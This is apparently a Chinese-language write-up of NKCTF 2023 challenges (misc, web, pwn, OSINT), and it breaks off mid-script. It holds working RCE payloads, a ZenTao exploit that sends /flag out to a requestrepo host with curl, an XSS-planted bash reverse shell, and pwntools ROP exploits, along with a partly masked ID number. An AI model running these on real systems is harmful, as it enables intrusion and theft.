在线rc4解密得到NKCTF&#123;H3l10_stm32&#125;
easy_word根据注释中的提示爆破密码
import hashlibbase=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;for j in range(62**4):    d=[]    for i in range(4):        d.append(base[j%62])        j=j//62    d=tuple(d)    e=&quot;h%s%svO%s%s0&quot;%d    hash=hashlib.sha256(e.encode()).hexdigest()    if &#x27;b75d1224&#x27; in hash[:8]:        print(e)        breakprint(e)

改成zip解压，media目录下有一张image1.png，图片上有key：Welcome_to_NKCTF
cloacked-pixel得到flag

三体stegsolve观察发现green和blue有数据，脚本提取
from PIL import Imagea=Image.open(&#x27;3.bmp&#x27;)d=a.getdata()w,h=a.sizee=[]for y in range(h):    for x in range(w):        i=a.getpixel((x,y))        e.append(chr((i[1]&lt;&lt;8)+i[2]))f=open(&#x27;1.txt&#x27;,&#x27;w&#x27;)f.write(&#x27;&#x27;.join(e))

得到NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;
easy_bmp在010中分别修改高和宽，得到key：BMP_Height_width_easy

解压后得到flag.bmp，继续爆破宽高，360*360，扫二维码得到flag
NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;
baby_music010打开，发现很多重复的10 27和11 27
将10 27转为0，11 27转为1
二进制转文件
f=open(&quot;flag.wav&quot;,&#x27;rb&#x27;)d=f.read()[0x2c:]e=[]q=&quot;&quot;for i in range(0,len(d),2):    if d[i]==0x10:        q+=&#x27;0&#x27;    else:        q+=&#x27;1&#x27;    if len(q)==8:        e.append(int(q,2))        q=&quot;&quot;f=open(&#x27;flag&#x27;,&#x27;wb&#x27;)f.write(bytes(e))f.close()

发现是zip
注释中0转为.，1转为-，换行转为/
.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..
解摩斯得到WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?
根据提示，猜测是深入明文攻击
先构造已知的明文，即flag.png的文件头加IHDR，写入到plain.txt
plain.txt：89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
使用bkcrack爆破key
bkcrack.exe -C flag.zip -c flag.png -p plain.txt
修改flag.zip的密码
bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy

解压得到flag
NKCTF&#123;You_are_very_smart!!&#125;
THMaster先开启THmaster.exe监听，再开启th12.exe
ce修改分数到2亿多

在replay文件夹下的th12_01.rpy中找到flag
easypic赛后复现
提示出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗
先将图片后多余的数据分离，使用veracrypt挂载，密钥为分离出的png

得到flag.png，图片尾得到Tips:566*566
放大图片观察到很多像素点，提取然后拼接
from PIL import Imageimg=Image.open(&#x27;flag.png&#x27;)img=img.resize((566,566),Image.NEAREST)img.save(&#x27;out.png&#x27;)

得到flagNKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;
五年Misc，三年模拟赛后复现(套娃题)
压缩包注释printf(&quot;%d%d%d%d%d%d&quot;,key[]);
6位数字爆破，得到114514
提示1：“CA1N”也很“疑惑”呢
猜测是要对文件异或
文件头为13 08 40 47，与常见文件头进行异或对比，发现异或0x43后为zip
得到一个加密的压缩包，根据提示2ZipCrypto，猜测是深入明文攻击
echo -n &quot;handsome&quot; &gt; plain.txtbkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304

改密码
bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy
解压出来一个handsome.jpg和带密码的5.rar
自拍照并没什么用，hashcat爆破rar
rar2john提取hash$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602
hashcat爆破密码hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u
最终得到密码BUSADJ

解压出的图片尾藏了一个逆序的png
with open(&#x27;5.png&#x27;,&#x27;rb&#x27;) as f:   with open(&#x27;6.png&#x27;,&#x27;wb&#x27;) as g:      g.write(f.read()[::-1])

修改高度，得到压缩包的密码be8b06bc13780abf
解压出的GGGGGGG.png结尾有串字符5D93CEB70E2BF5DAA84EC3D0CD2C731A
32位的，推测为md5，在线网站得到qwer1234

拿这个密码去跑cloacked-pixel，得到下一层压缩包密码f442212b3d398a8e
根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码764dc6c0361fc0fd
看文件头，明显的F5隐写，得到下一层密码un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26
wav文件，一听就是sstv了，得到NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;

baby_bitlocker赛后复现
先做2023.3.2
看的出来，出题人很喜欢明文攻击
pcapng文件格式
echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txtbkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy
解压后得到tonF.docx和usb.pcapng
对数据包分析，发现是usb键盘流量，使用UsbMiceDataHacker提取PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;
docx密码为NKCTF2023_YYDS_YYDS!!!
进入文档后发现字体为Byxs20_font
且文档中的内容复制后与文档内不一样了

odttf转ttf
打开/word/fontTable.xml，得到font-name为Byxs20_font，fontKey为&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;
将\word\fonts\font1.odttf重命名为F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf
python转换
import osodttf_name = &quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;odttf_path = os.path.abspath(odttf_name)with open(odttf_path, &quot;rb&quot;) as f:    data = f.read()# 获取文件名file_name = os.path.splitext(odttf_path)[0].split(&quot;\\&quot;)[-1].replace(&quot;-&quot;, &quot;&quot;)# 获取keykey = []for i in range(len(file_name), 0, -2):    key.append(int(file_name[i-2:i], 16))with open(&quot;./font1.ttf&quot;, &quot;wb&quot;) as f:    for i in range(32):        f.write(bytes([data[i] ^ key[i % len(key)]]))    f.write(data[32:])

fontforge识别

得到一半flag：nkctf&#123;ttf_is_funny_
接着做2023.3.4
内存取证python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;

提取PYTHON.rar
python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./

用这个密钥恢复加密分区

得到bitlocker_is_very_interesting&#125;
最后看2023.3.3
hint：flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？
根据提示3x3，猜测是4进制
exiftool得到提示上北下南左西右东

python提取
import cv2img = cv2.imread(&quot;./flag2.png&quot;,cv2.IMREAD_UNCHANGED)r,c = img.shape#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]flag2_xy = [(1,0),(1,2),(0,1),(2,1)]for y in range(0,r,3):    for x in range(0,c,3):        roi_img = img[y: y+3, x: x+3]        #for i in flag_xy:        #    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)        tmp = &quot;&quot;        for i in flag2_xy:            tmp += str(roi_img[i[::-1]])        print(chr(int(tmp,4)),end=&quot;&quot;)

得到flag2 is here: images_are_fun_
三段flag拼接起来NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;
BlockchainSignIn区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text

HelloWorldnc后先创建部署题目的合约账户水龙头转账，部署合约
查看合约代码
pragma solidity 0.8.7;contract HelloWorld &#123;    string greeting;    constructor(string memory _greeting) public &#123;        greeting = _greeting;    &#125;    function greet() public view returns (string memory) &#123;        return greeting;    &#125;    function setGreeting(string memory _greeting) public &#123;        greeting = _greeting;    &#125;    function isSolved() public view returns (bool) &#123;        string memory expected = &quot;Hello,NKCTF2023&quot;;        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));    &#125;&#125;

调用setGreeting改greeting的值即可
在metamask中链接题目给的私链

使用remix ide
编译后指定题目部署的地址
调用setGreeting，参数输出字符串&quot;Hello,NKCTF2023&quot;

在Metamask确认交易请求
等待交易打包，确认上链

decompile_revenge与第一题一样，不过sha256加密了在提供的网站上解

NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;
webbaby_php反序列化
&lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#x27;oww!man!!&#x27;;        public function __construct()&#123;            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    function waf($string)&#123;        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;            die(&quot;you are bad&quot;);        &#125;    &#125;    class Happy&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            waf($cmd);            eval($shell($cmd));        &#125;    &#125;    class Hell0&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#x27;p&#x27;]))&#123;        unserialize($_GET[&#x27;p&#x27;]);    &#125;else&#123;        highlight_file(__FILE__);    &#125;?&gt;

最终需要在Happy类中执行eval，__invoke在将对象当作函数来使用时调用此方法，在Hell0类中可以调用函数$function()以触发__invoke，而调用函数需要触发__toString方法，而在Welcome类中存在echo，可以触发__toString
反序列化后会有一个waf方法来检查$cmd中的值是否存在f,l,a,g,*,?
列目录：dir /
O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;

读/f1ag：使用gzdecode编码绕过
payload
&lt;?php//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;//echo urlencode(gzencode($cmd));class Welcome&#123;	public $name=&#x27;welcome_to_NKCTF&#x27;;	public $arg = &#x27;Hell0&#x27;;&#125;class Happy&#123;	public $shell=&#x27;gzdecode&#x27;;	public $cmd=&#x27;&#x27;;	function __construct()&#123;		$this-&gt;cmd = urldecode(&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;);	&#125;&#125;class Hell0&#123;	public $func=&#x27;Happy&#x27;;&#125;$a = new Welcome();$a-&gt;arg = new Hell0();$a-&gt;arg-&gt;func = new Happy();echo urlencode(serialize($a));?&gt;

O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D

eazy_php&lt;?php    highlight_file(__FILE__);    error_reporting(0);    if($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))&#123;        if((string)$_POST[&#x27;c&#x27;] != (string)$_POST[&#x27;d&#x27;] &amp;&amp; sha1($_POST[&#x27;c&#x27;]) === sha1($_POST[&#x27;d&#x27;]))&#123;            if($_GET[&#x27;e&#x27;] != 114514 &amp;&amp; intval($_GET[&#x27;e&#x27;]) == 114514)&#123;                if(isset($_GET[&#x27;NS_CTF.go&#x27;]))&#123;                    if(isset($_POST[&#x27;cmd&#x27;]))&#123;                        if(!preg_match(&#x27;/[0-9a-zA-Z]/i&#x27;, $_POST[&#x27;cmd&#x27;]))&#123;                            eval($_POST[&#x27;cmd&#x27;]);                        &#125;else&#123;                            die(&#x27;error!!!!!!&#x27;);                        &#125;                    &#125;else&#123;                        die(&#x27;error!!!!!&#x27;);                    &#125;                &#125;else&#123;                    die(&#x27;error!!!!&#x27;);                &#125;            &#125;else&#123;                die(&#x27;error!!!&#x27;);            &#125;        &#125;else&#123;            die(&#x27;error!!&#x27;);        &#125;    &#125;else&#123;        die(&#x27;error!&#x27;);    &#125;?&gt;

第一层md5弱比较，使用数组绕过a[]=1&amp;b[]=2
第二层sha1强比较c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
第三层数字比较缺陷，使用小数类型e=114514.20
第四层php变量值特性，使用[代替_NS[CTF.go
第五层无字母数字rce，使用取反cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);
easy_cms访问后台/dede/，用户名admin，密码admin
左侧核心栏中有个文件式管理器，可以上传文件
存在过滤
// 不允许这些字符$content = preg_replace(&quot;#(/\*)[\s\S]*(\*/)#i&quot;, &#x27;&#x27;, $content);global $cfg_disable_funs;$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : &#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;;$cfg_disable_funs = $cfg_disable_funs.&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;;foreach (explode(&quot;,&quot;, $cfg_disable_funs) as $value) &#123;    $value = str_replace(&quot; &quot;, &quot;&quot;, $value);    if(!empty($value) &amp;&amp; preg_match(&quot;#[^a-z]+[&#x27;\&quot;]*&#123;$value&#125;[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123;        $content = dede_htmlspecialchars($content);        die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;);    &#125;&#125;if(preg_match(&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123;    if(preg_match(&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123;        $content = dede_htmlspecialchars($content);        die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;);    &#125;    if(preg_match(&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123;        $content = dede_htmlspecialchars($content);        die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;);    &#125;    if(preg_match(&quot;#[`][\s\S]*[`]#i&quot;, &quot; &#123;$content&#125;&quot;) == TRUE) &#123;        $content = dede_htmlspecialchars($content);        die(&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;&#123;$content&#125;&lt;/pre&gt;&quot;);    &#125;&#125;

使用scandir列目录
&lt;?phpvar_dump(scandir(&#x27;/&#x27;));?&gt;

使用include读文件
&lt;?phpinclude &#x27;/f1Aggg&#x27;;?&gt;


webpagetestwebpagetest反序列化
AVD-2022-1474319
借助phpggc生成执行cat /flag命令的phar文件并发送
./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.iniURLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -


easy_pms右键查看网页源代码得到版本为18.0.beta1
github搜到poc
修改一下，加个回显，用curl外带到第三方平台/flag太长用grep+base64筛选
# -*- coding: UTF-8 -*-# !/usr/bin/python&#x27;&#x27;&#x27;权限绕过+RCE POC 伪静态传参版禅道系统 影响版本 安全版本开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2&#x27;&#x27;&#x27;import requestsproxies = &#123;    #&quot;http&quot;: &quot;127.0.0.1:8080&quot;,    #&quot;https&quot;: &quot;127.0.0.1:8080&quot;,&#125;def check(url):    # url=&quot;http://10.211.55.3:8008&quot;    url1 = url+&#x27;/misc-captcha-user.html&#x27;    # url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参    # url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接    url3 = url + &#x27;repo-create.html&#x27;    url4 = url + &#x27;repo-edit-10000-10000.html&#x27;    headers=&#123;        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,        &quot;Cookie&quot;:&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,    &#125;    headers2 = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,        &quot;Cookie&quot;: &quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,        &quot;Referer&quot;:url+&quot;/repo-edit-1-0.html&quot;    &#125;    data1 = &#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;    data2 = &#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;    s=requests.session()    try:        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers2)        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers2)        print(req4.text)    except Exception as e:        print(e)    return Falseif __name__ == &#x27;__main__&#x27;:    print(check(&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;))


xiaopi小皮存储型XSS-&gt;rce
参考文章
请求头加上X-Requested-With: XMLHttpRequest就能访问登录框
vps上放定时任务，反弹shell
function poc()&#123;  $.get(&#x27;/service/app/tasks.php?type=task_list&#x27;,&#123;&#125;,function(data)&#123;    var id=data.data[0].ID;    $.post(&#x27;/service/app/tasks.php?type=exec_task&#x27;,&#123;      tid:id    &#125;,function(res2)&#123;        $.post(&#x27;/service/app/log.php?type=clearlog&#x27;,&#123;        &#125;,function(res3)&#123;&#125;,&quot;json&quot;);    &#125;,&quot;json&quot;);  &#125;,&quot;json&quot;);&#125;function save()&#123;  var data=new Object();  data.task_id=&quot;&quot;;  data.title=&quot;test&quot;;  data.exec_cycle=&quot;1&quot;;  data.week=&quot;1&quot;;  data.day=&quot;3&quot;;  data.hour=&quot;16&quot;;  data.minute = &quot;35&quot;;  data.shell=&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;;  $.post(&#x27;/service/app/tasks.php?type=save_shell&#x27;,data,function(res)&#123;    poc();  &#125;,&#x27;json&#x27;);&#125;save();

python开启一个http服务
python3 -m http.server 7777

在登录处用户名框中插入&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;

插入完后等待管理员bot登录，触发计划任务，反弹shell

hard_php赛后复现
ctfshow的题目加上一些函数禁用
&lt;?php// not only ++error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&#x27;NKCTF&#x27;])) &#123;    $NK = $_POST[&#x27;NKCTF&#x27;];    if (is_string($NK)) &#123;        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;            eval($NK);        &#125;else&#123;            echo(&quot;hacker!!!&quot;);        &#125;    &#125;else&#123;        phpinfo();    &#125;&#125;?&gt;


NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt
url编码后上传
Social EngineeringBridge百度识图得到关键信息海口，进新闻得到世纪大桥，在世纪大桥旁边有一个世纪公园

NKCTF&#123;海南省海口市龙华区世纪公园&#125;
两个人的夜晚根据图上的NCC新城市中心去百度地址
NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;
狂飙抖音搜狂飙取景地得到莲平路

NKCTF&#123;广东省江门市蓬江区莲平路&#125;
real-social-engineeringgithub搜他id，找到博客地址：https://tacooo0o.github.io/
在2021年终总结这篇文章中找到驾驶证图片，包含了身份证信息
NKCTF&#123;6107**********4710&#125;
Ferris_Wheel百度识图得到永川，摩天轮，渝西等关键词

百度地图找到渝西之眼，组合爆破下地名
NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;
旅程的开始百度地图搜中铁酒店，得到贵阳火车站，实景一点一点与图片对比

NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;
The other Bridge百度识图，得到戴家巷崖壁步道

根据提示加个畔
NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;
decompile步骤与上面的decompile_revenge一样
NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;
pwnezshellcodefrom pwn import *e=ELF(&#x27;./pwn&#x27;)context.binary=e#p=process(&#x27;./pwn&#x27;)p=remote(&quot;node.yuzhian.com.cn:32220&quot;)shell=asm(shellcraft.sh()).rjust(0x100,b&#x27;\x90&#x27;)p.sendafter(b&#x27;min!&#x27;,shell)p.interactive()

a_story_of_a_pwnerfrom pwn import *#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;node.yuzhian.com.cn:36024&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)e=ELF(&#x27;./pwn&#x27;)context.binary=ep.sendlineafter(&#x27;&gt; \n&#x27;,&#x27;4&#x27;)p.readuntil(&#x27;see this. &#x27;)d=int(p.readline().decode().strip(),16)print(hex(d))libc.address=d-libc.sym[&#x27;puts&#x27;]print(hex(libc.address))rdi=libc.address+0x0019764dbin_sh=next(libc.search(b&#x27;/bin/sh&#x27;))system=libc.sym[&#x27;system&#x27;]p.sendlineafter(&#x27;&gt; \n&#x27;,&#x27;1&#x27;)p.sendafter(&#x27;comment?&#x27;,p64(bin_sh))p.sendlineafter(&#x27;&gt; \n&#x27;,&#x27;2&#x27;)p.sendafter(&#x27;corment?&#x27;,p64(rdi))p.sendlineafter(&#x27;&gt; \n&#x27;,&#x27;3&#x27;)p.sendafter(&#x27;corMenT?&#x27;,p64(system))payload=b&#x27;a&#x27;*0xa+p64(0x405098)+p64(0x401502)p.sendlineafter(&#x27;&gt; \n&#x27;,&#x27;4&#x27;)p.send(payload)p.interactive()


ez_stackfrom pwn import *e=ELF(&#x27;./ez_stack&#x27;)context.binary=eax_f=0x401146syscall=0x40114ebss=e.bss(0x400)#p=process(&#x27;./ez_stack&#x27;)p=remote(&#x27;node2.yuzhian.com.cn&#x27;,&#x27;39605&#x27;)sig=SigreturnFrame()sig.rax=0sig.rip=syscallsig.rdi=0sig.rsi=bsssig.rdx=0x200sig.rsp=bss+8payload=b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(ax_f)+p64(syscall)+flat(sig)p.sendafter(&#x27;NKCTF!\n&#x27;,payload)sig1=SigreturnFrame()sig1.rax=59sig1.rdi=bsssig1.rsi=0sig1.rdx=0sig1.rsp=bss+0x200sig1.rip=syscallpayload1=b&#x27;/bin/sh\x00&#x27;+p64(ax_f)+p64(syscall)+flat(sig1)p.send(payload1)p.interactive()


baby_ropfrom pwn import *from LibcSearcher import *context.log_level=&#x27;debug&#x27;debug=0while True:    if debug==1:        p=process(&quot;./nkctf_message_boards&quot;)    else:        p=remote(&#x27;node2.yuzhian.com.cn:31457&#x27;)    try:        e=ELF(&quot;nkctf_message_boards&quot;)        func=&#x27;puts&#x27;        func_got=e.got[func]        puts=e.plt[&#x27;puts&#x27;]        rdi=0x00401413        leave=0x40138a        bss=e.bss(0x200)        read=0x401351        main=e.sym[&#x27;main&#x27;]        ret=0x00401434        #gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)        p.sendlineafter(&#x27;name: &#x27;,b&#x27;%41$p&#x27;)        p.readuntil(&#x27;Hello, &#x27;)        canary=int(p.readuntil(&#x27;What&#x27;,drop=1),16)        print(hex(canary))        n=0x30        pad=b&#x27;a&#x27;*n        payload=pad+p64(ret)*13+p64(rdi)+p64(func_got)+p64(puts)+p64(main)        payload=payload.ljust(0xf8,b&#x27;\x00&#x27;)        payload+=p64(canary)        p.sendafter(&#x27;NKCTF: &#x27;,payload)        p.readuntil(&#x27;carefully.\n&#x27;)        d=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))        print(hex(d))        if debug==1:            